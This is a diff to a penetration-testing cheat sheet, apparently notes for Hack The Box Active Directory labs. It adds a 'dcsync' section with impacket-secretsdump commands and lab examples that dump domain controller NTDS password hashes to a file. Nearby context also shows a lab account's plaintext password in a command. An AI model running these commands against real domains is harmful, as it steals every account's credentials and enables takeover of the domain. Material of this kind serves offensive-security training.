@@ -48,6 +48,15 @@ Dump ntds credentials
 impacket-secretsdump -just-dc 'ILF.LOCAL\jmarston:P@ssword!'@10.129.202.85
 ```
 
+Do a dcsync:
+
+```shell
+impacket-secretsdump -outputfile <file_to_save_hashes> -just-dc <domain_name>/<username_with_permissions>:<password>@<dc_ip>
+#Examples:
+impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/tpetty:password1!@DC01.INLANEFREIGHT.LOCAL
+impacket-secretsdump -outputfile htb_local_hashes -just-dc htb/john@10.129.8.96
+```
+
 ## Permissions Required
 
 | Privilege               | Local Machine (SAM)  | Domain Controller (NTDS.dit) |
